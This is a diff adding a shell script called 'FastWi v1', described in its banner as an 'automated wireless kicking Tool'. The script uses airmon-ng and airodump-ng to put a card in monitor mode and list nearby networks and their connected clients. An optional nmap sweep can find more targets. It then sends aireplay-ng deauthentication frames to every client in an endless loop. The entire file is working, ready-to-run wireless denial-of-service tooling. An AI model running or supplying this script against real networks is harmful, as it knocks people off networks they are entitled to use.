@@ -1,0 +1,287 @@
+#!/bin/sh
+
+
+#########################
+#	VARIABLES	#
+#########################
+
+waitsecs=12
+
+packetthresh=1
+
+speed=53
+
+deauthframes=1
+
+csvfile='airodump-temp-01.csv'
+
+csvpattern='airodump-temp'
+
+xmlpattern='airodump-temp'
+
+#########################
+#	Classes		#
+#########################
+
+
+banner()
+{
+
+clear
+echo "                                         "
+echo "                                   FastWi v1"
+echo "                            -> "
+echo "   <-           ( )  ->            automated wireless kicking Tool"
+echo "          <-    /_\ ->       "
+echo "   <-          /___\               by Tim Windelschmidt"
+echo " <-           /_____\        "
+echo "      <-     /       \   -> "
+
+}
+
+cleanup ()
+{
+
+	close
+	printf 'Quitting soon, cleaning up first...\n'
+
+	if (pidof "aireplay-ng"); then
+	   printf 'Found at least one aireplay-ng running, sending SIGKILL...\n'
+	   for x in $(pidof aireplay-ng); do
+	       printf "Sending SIGKILL to PID ${x} ...\n"
+	       kill -9 "${x}"
+	   done
+	fi
+
+	if (pidof "airodump-ng"); then
+	       printf 'Found at least one airodump-ng running, sending SIGKILL...\n'
+	       for x in $(pidof airodump-ng); do
+		   printf "Sending SIGKILL to PID ${x} ...\n"
+		   kill -9 "${x}"
+	       done
+	   fi
+
+	airmon-ng stop "${moninterface}"
+
+	if [ -f "${xmlpattern}" ]; then
+	    rm -rf "${xmlpattern}"
+	    printf 'Found and removed temp XML...\n'
+	else
+	    printf 'Temp XML not found...\n'
+	fi
+
+	if [ -f "${csvfile}" ]; then
+	    rm -rf "${csvfile}"
+	    printf 'Found and removed temp CSV...\n'
+	else
+	    printf 'Temp CSV not found...\n'
+	fi
+	printf 'Cleaning up variables...\n'
+	cleanvars
+	printf 'Done cleaning up.  Thank you, come again!\n'
+	exit
+
+}
+
+cleanvars ()
+{
+
+	unset waitsecs
+	unset packetthresh
+	unset channel
+	unset bssid
+	unset moninterface
+	unset wlaninterface
+	unset deauthframes
+	unset csvfile
+	unset csvpattern
+	unset wlanmac
+	unset stations
+	unset i
+	unset x
+
+}
+
+getinfo()
+{
+
+echo "Name of Wireless Card?"
+echo ''
+echo "Connected Adapters:	[wlan0]"
+echo ''
+ifconfig |grep "wlan"
+echo ''
+read wlaninterface
+
+if [ -z "$wlaninterface" ]; then
+	wlaninterface=wlan0
+fi
+
+clear
+
+echo "Name for monitoring Interface?"
+echo ''
+echo "Connected Adapters:	[mon0]"
+ifconfig |grep "mon"
+echo ''
+read moninterface
+
+if [ -z $moninterface ]; then
+	moninterface=mon0
+fi
+
+clear
+
+}
+
+network()
+{
+
+
+echo "Which Network?"
+echo ''
+echo "Networks in Range:"
+echo ''
+echo $bssids
+echo ''
+read bssid
+clear
+
+if [ -z $bssid ]; then
+	cleanup
+fi
+
+echo "Users in this Network:"
+echo $stations
+echo ""
+
+}
+
+getnetworkcards()
+{
+
+wlanmac=$(ifconfig "${wlaninterface}" | awk '/HWaddr/{print $NF}')
+
+}
+
+checkforroot()
+{
+
+if [ "$(id -u)" != "0" ]; then
+   echo "This script must be run as root" 1>&2
+   exit 1
+fi
+
+}
+
+
+close()
+{
+
+for x in $(pidof aireplay-ng); do
+	wait "${x}"
+done
+
+}
+
+askfornmap()
+{
+
+if [ -z "$stations" ]; then
+	echo "No Targets are found."
+	echo ""
+fi
+
+echo "Are you want to scan with nmap?"
+echo ""
+read nampanswer
+echo ""
+
+case $nampanswer in
+	yes|y) scannmap;;
+	no|n) return;;
+	*) return;;
+esac
+
+}
+
+scannmap()
+{
+
+echo "Which IP-Network?		e.g. '192.168.0.0/16'"
+echo ""
+read network
+
+echo "Starting NMap this can take a long while..."
+echo ""
+stations=$(nmap -sP $network | grep "MAC" | awk -F " " '{print $3}')
+
+}
+
+
+decode()
+{
+
+printf 'Listing MACs that are about to get a stack of deauth frames in a lot seconds...\r\n'
+
+bssids=$(awk -F, -v p=${speed} '/Speed/ {i=1; next} i && $5 > p {print "ESSID: "$14,"--- BSSID: ",$1}' "${csvfile}")
+
+stations=$(awk -F, -v p=${packetthresh} '/Station/ {i=1; next} i && $5 > p {print $1}' "${csvfile}")
+
+}
+
+kick()
+{
+
+echo "Kicking now following Users:"
+echo $stations
+echo ""
+
+while true; do
+	aireplaykick
+done
+
+}
+
+aireplaykick()
+{
+
+for station in $stations; do
+	aireplay-ng -D --deauth "${deauthframes}" "${moninterface}" -a "${bssid}" -s "${bssid}" -c "${station}" --ignore-negative-one &
+done
+
+}
+
+#########################
+#	Main		#
+#########################
+
+
+banner
+
+checkforroot
+
+getinfo
+
+trap cleanup INT
+
+ifconfig |grep "${moninterface}" || airmon-ng start "${wlaninterface}"
+
+ls -la "${csvpattern}"*.csv && rm -rf "${csvpattern}"*.csv
+ls -la "${csvfie}" && rm -rf "${csvfile}"
+
+airodump-ng "${moninterface}" --write "${csvpattern}" --output-format csv &
+
+sleep "${waitsecs}"
+
+killall airodump-ng
+clear
+
+decode
+network
+askfornmap
+kick
+
+cleanup
+# quit and return a valid exit status
+exit 0
